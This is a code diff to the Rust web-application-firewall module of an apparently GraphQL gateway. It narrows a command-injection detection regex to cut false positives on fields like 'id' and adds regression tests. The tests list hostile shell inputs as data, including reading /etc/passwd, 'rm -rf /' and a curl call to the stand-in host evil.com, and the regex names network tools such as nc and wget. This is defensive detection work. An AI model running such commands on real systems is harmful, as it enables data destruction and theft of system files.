@@ -132,9 +132,16 @@ const NOSQLI_PATTERNS: &[&str] = &[
 ];
 
 /// Command Injection patterns (OS Command Injection)
+///
+/// NOTE: We intentionally exclude `\n` (newline) and `$` from the separator
+/// group because they cause false positives in GraphQL queries:
+///   - `\n` is normal multi-line formatting (e.g. `{\n  id\n  message\n}`)
+///   - `$` is the GraphQL variable prefix (e.g. `$id`, `$name`)
+/// We also use word boundary `\b` after the command name to avoid partial
+/// matches (e.g. "identity" should not trigger on "id").
 const CMDI_PATTERNS: &[&str] = &[
-    // Separators with commands
-    r"(?i)(;|\||\|\||&|&&|\n|`|\$)\s*(ls|cat|rm|mv|cp|echo|wget|curl|ping|nc|netcat|nmap|whoami|id|pwd|grep|awk|sed|tar|zip|unzip|python|perl|ruby|gcc|make|kill|sudo|su|ssh|scp|ftp|telnet|dig|nslookup|ifconfig|ip|route|ps|top|free|df|du|uname|hostname|env|export|alias|declare|mount|umount|chmod|chown|chgrp|touch|mkdir|rmdir)\s",
+    // Separators with commands — only real shell metacharacters
+    r"(?i)(;|\||\|\||&|&&|`)\s*\b(ls|cat|rm|mv|cp|echo|wget|curl|ping|nc|netcat|nmap|whoami|id|pwd|grep|awk|sed|tar|zip|unzip|python|perl|ruby|gcc|make|kill|sudo|su|ssh|scp|ftp|telnet|dig|nslookup|ifconfig|ip|route|ps|top|free|df|du|uname|hostname|env|export|alias|declare|mount|umount|chmod|chown|chgrp|touch|mkdir|rmdir)\b",
     // Specific constructs
     r"(?i)\$(?:\(|`)[^`)]+(?:\)|`)", // $(...) or `...`
     r"(?i)/bin/sh",
@@ -691,4 +698,89 @@ pub fn validate_query_string(query: &str, config: &WafConfig) -> Result<()> {
         return Err(Error::Validation("Potential SSTI detected".to_string()));
     }
     Ok(())
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    /// Regression test for https://github.com/Protocol-Lattice/grpc_graphql_gateway/issues/67
+    /// `id` (and other short command names) must NOT trigger CMDI detection
+    /// when used as normal GraphQL field names.
+    #[test]
+    fn test_cmdi_no_false_positive_on_id_field() {
+        let queries = vec![
+            // Inline query with `id`
+            r#"query Test { hello(name: "rawr") { id message } }"#,
+            // Multi-line query (the original failing case)
+            "query Test {\n  hello(name: \"rawr\") {\n    id\n    message\n  }\n}",
+            // `id` as an argument
+            r#"{ node(id: "123") { ... on User { id name } } }"#,
+            // `id` as a GraphQL variable
+            r#"query($id: ID!) { user(id: $id) { id name } }"#,
+            // Multiple short command-name-like fields
+            "{ system { id ip hostname env } }",
+            // Entity with `id` key
+            r#"{ _entities(representations: [{__typename: "User", id: "1"}]) { ... on User { id } } }"#,
+        ];
+
+        let config = WafConfig::default();
+        for query in &queries {
+            let result = validate_raw(query, None, &config);
+            assert!(
+                result.is_ok(),
+                "False positive CMDI on query: {}",
+                query.replace('\n', "\\n")
+            );
+        }
+    }
+
+    /// Verify that real command injection attempts are still caught.
+    #[test]
+    fn test_cmdi_catches_real_attacks() {
+        let attacks = vec![
+            "; whoami",
+            "| cat /etc/passwd",
+            "&& rm -rf /",
+            "|| id",
+            "; ls",
+            "` whoami `",
+            "& curl http://evil.com",
+            "/bin/sh",
+            "/bin/bash",
+            "powershell",
+            "$(whoami)",
+        ];
+
+        let config = WafConfig::default();
+        for attack in &attacks {
+            let result = validate_raw(attack, None, &config);
+            assert!(
+                result.is_err(),
+                "Missed real CMDI attack: {}",
+                attack
+            );
+        }
+    }
+
+    /// Verify that `id`-like words inside longer identifiers don't trigger.
+    #[test]
+    fn test_cmdi_no_match_on_partial_words() {
+        let queries = vec![
+            "{ user { identity provider } }",
+            "{ widget { uuid } }",
+            "{ order { productId } }",
+            "{ config { endpoint } }",
+        ];
+
+        let config = WafConfig::default();
+        for query in &queries {
+            let result = validate_raw(query, None, &config);
+            assert!(
+                result.is_ok(),
+                "False positive CMDI on partial word in query: {}",
+                query
+            );
+        }
+    }
 }
